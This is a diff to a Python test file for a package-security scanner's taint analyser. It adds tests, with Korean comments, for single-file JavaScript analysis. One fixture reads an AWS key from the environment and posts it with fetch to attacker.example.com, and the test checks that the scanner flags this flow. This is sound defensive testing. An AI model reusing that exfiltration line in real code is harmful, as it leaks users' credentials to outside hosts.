@@ -6,7 +6,9 @@ from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
+from pkgsentinel.stages.stage1_entry_point import EntryFile
 from pkgsentinel.stages.taint_slicer import (
+    analyze_file,
     analyze_javascript_cross_file,
     analyze_python,
     analyze_python_cross_file,
@@ -205,10 +207,57 @@ fetch('https://x.com', { body: SECRET });
     print("  OK no flow propagated to wrong import target")
 
 
+# ─────────────── analyze_file: 단일파일 JS ───────────────
+
+_JS_SINGLE_MAL = '''
+const secret = process.env.AWS_KEY;
+fetch('https://attacker.example.com', { body: secret });
+'''
+
+_JS_SINGLE_BEN = '''
+const name = "hello";
+console.log(name);
+'''
+
+
+def test_analyze_file_js_single_malicious():
+    """analyze_file 의 JS 분기 — within-file source→sink 흐름 잡힘."""
+    print("\n[analyze_file JS] within-file process.env -> fetch")
+    ef = EntryFile(
+        path="evil.js", basename="evil.js",
+        content=_JS_SINGLE_MAL, size=len(_JS_SINGLE_MAL),
+        language="javascript",
+    )
+    rpt = analyze_file(ef)
+    print(f"  flows: {len(rpt.flows)}")
+    for f in rpt.flows:
+        print(f"    - {f.to_summary()} (var={f.tainted_var})")
+    # secret -> fetch 흐름 검출
+    assert any(
+        "fetch" in f.sink_call and f.tainted_var == "secret"
+        for f in rpt.flows
+    ), f"expected secret→fetch flow, got {rpt.flows}"
+    print("  OK")
+
+
+def test_analyze_file_js_single_benign():
+    print("\n[analyze_file JS] benign single file → no flow")
+    ef = EntryFile(
+        path="util.js", basename="util.js",
+        content=_JS_SINGLE_BEN, size=len(_JS_SINGLE_BEN),
+        language="javascript",
+    )
+    rpt = analyze_file(ef)
+    assert not rpt.flows, f"unexpected flows: {rpt.flows}"
+    print("  OK no flows")
+
+
 def main():
     tests = [test_malicious, test_benign, test_slice_format,
              test_cross_file_basic, test_cross_file_no_match,
-             test_cross_file_basic_js, test_cross_file_no_match_js]
+             test_cross_file_basic_js, test_cross_file_no_match_js,
+             test_analyze_file_js_single_malicious,
+             test_analyze_file_js_single_benign]
     failed = 0
     for t in tests:
         try:
